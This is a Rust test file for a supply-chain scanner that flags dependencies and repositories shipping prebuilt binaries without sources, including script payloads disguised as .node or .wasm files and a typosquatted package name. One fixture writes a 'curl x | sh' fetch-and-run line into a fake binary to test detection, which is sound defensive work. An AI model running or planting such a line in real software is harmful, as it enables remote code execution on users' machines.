use super::super::{Kind, ids, scan_dir};
use super::*;

#[test]
fn dependencies_that_ship_binaries_without_sources() {
    let d = crate::utils::temp::TempDir::new("blobs").unwrap();
    let root = d.path();
    std::fs::create_dir_all(root.join("node_modules/lodahs/build")).unwrap();
    std::fs::create_dir_all(root.join("node_modules/@esbuild/darwin-arm64/bin")).unwrap();
    std::fs::create_dir_all(root.join("node_modules/honest/src")).unwrap();
    std::fs::write(root.join("node_modules/lodahs/build/helper.node"), b"\xcf\xfa\xed\xfe\x0c\x00\x00\x01").unwrap();
    std::fs::write(root.join("node_modules/@esbuild/darwin-arm64/bin/esbuild"), b"\xcf\xfa\xed\xfe").unwrap();
    std::fs::write(root.join("node_modules/honest/src/addon.cc"), "int main(){}").unwrap();
    std::fs::write(root.join("node_modules/honest/addon.node"), b"\x7fELF\x02\x01\x01\x00").unwrap();
    let got = dependency_blobs(root, &Policy::default());
    assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", false)], "{got:?}");
    assert!(got[0].file.starts_with("node_modules/lodahs/"), "{got:?}");
    assert!(got[0].note.contains("ships 1 prebuilt binary (helper.node)"), "{}", got[0].note);
    // A ".node" that is a script is a payload.
    std::fs::write(root.join("node_modules/lodahs/build/helper.node"), "#!/bin/sh\ncurl x | sh\n").unwrap();
    let got = dependency_blobs(root, &Policy::default());
    assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", true)], "{got:?}");
    assert!(got[0].note.contains("starts with 23 21 2f 62"), "{}", got[0].note);
    let p = Policy::parse("ids = [\"BINARY-BLOB\"]\n");
    assert!(dependency_blobs(root, &p).iter().all(|s| !s.hard), "the policy downgrades");
    assert!(dependency_blobs(root.join("node_modules/honest").as_path(), &p).is_empty(), "no node_modules: nothing");
}

#[test]
fn many_blobs_are_counted_and_the_first_three_named() {
    let d = crate::utils::temp::TempDir::new("blobs-many").unwrap();
    let root = d.path();
    let dir = root.join("node_modules/prebuilt/prebuilds");
    std::fs::create_dir_all(&dir).unwrap();
    for name in ["a.node", "b.dll", "c.dylib", "d.exe", "libe.so.1"] {
        std::fs::write(dir.join(name), b"MZ\x90\x00\x03\x00").unwrap();
    }
    std::fs::write(dir.join("ld.so"), "INPUT(libx.so.1)\n").unwrap();
    let got = dependency_blobs(root, &Policy::default());
    assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", false)], "an ld script named .so is not a payload: {got:?}");
    assert!(
        got[0].note.contains("ships 6 prebuilt binaries (a.node, b.dll, c.dylib, …) with no source to build them from"),
        "{}",
        got[0].note
    );
    std::fs::write(dir.join("short.wasm"), b"\0a").unwrap();
    assert_eq!(
        ids(&dependency_blobs(root, &Policy::default())),
        [("SUSPECT-BINARY-BLOB", false)],
        "too short to say is not a payload"
    );
    std::fs::write(dir.join("fake.wasm"), b"\x7fELF\x02\x01").unwrap();
    let got = dependency_blobs(root, &Policy::default());
    assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", true)], "an ELF named .wasm is not WebAssembly: {got:?}");
}

#[test]
fn the_repos_own_tree() {
    let d = crate::utils::temp::TempDir::new("blobs-tree").unwrap();
    let root = d.path();
    std::fs::write(root.join("engine.wasm"), b"\0asm\x01\x00\x00\x00").unwrap();
    crate::utils::walk::forget_walks();
    let got = scan_dir(root, Kind::Repo, &Policy::default());
    assert_eq!(ids(&got), [("SUSPECT-BINARY-BLOB", false)], "{got:?}");
    assert!(got[0].note.contains("commits 1 prebuilt binary (engine.wasm)"), "{}", got[0].note);
    crate::utils::walk::forget_walks();
    assert!(
        scan_dir(root, Kind::Installed, &Policy::default()).is_empty(),
        "installed code is expected to ship binaries"
    );
    std::fs::create_dir_all(root.join("dist")).unwrap();
    std::fs::create_dir_all(root.join("tests")).unwrap();
    std::fs::write(root.join("dist/out.wasm"), b"\0asm").unwrap();
    std::fs::write(root.join("tests/fixture.exe"), "not a program").unwrap();
    crate::utils::walk::forget_walks();
    let got = scan_dir(root, Kind::Repo, &Policy::default());
    assert_eq!(got.len(), 1, "output and fixtures are not the tree: {got:?}");
    std::fs::write(root.join("Cargo.toml"), "[package]\n").unwrap();
    crate::utils::walk::forget_walks();
    assert!(scan_dir(root, Kind::Repo, &Policy::default()).is_empty(), "with sources it is nothing");
    std::fs::write(root.join("helper.node"), "#!/bin/sh\n").unwrap();
    crate::utils::walk::forget_walks();
    assert_eq!(
        ids(&scan_dir(root, Kind::Repo, &Policy::default())),
        [("SUSPECT-BINARY-BLOB", true)],
        "a payload fails even beside sources"
    );
}

#[test]
fn names_and_publishers() {
    assert!(is_blob_name("x.NODE") && is_blob_name("libz.so.1.2") && is_blob_name("a.dylib"));
    assert!(!is_blob_name("x.js") && !is_blob_name("notes.soon") && !is_blob_name("node"));
    assert!(native_source_name("binding.gyp") && native_source_name("CMakeLists.txt") && native_source_name("a.cc"));
    assert!(!native_source_name("index.js") && !native_source_name("README.md"));
    assert!(known_native("@esbuild/darwin-arm64") && known_native("sharp") && known_native("wasm-pack"));
    assert!(!known_native("sharpe") && !known_native("@esbuild") && !known_native("lodahs"));
}
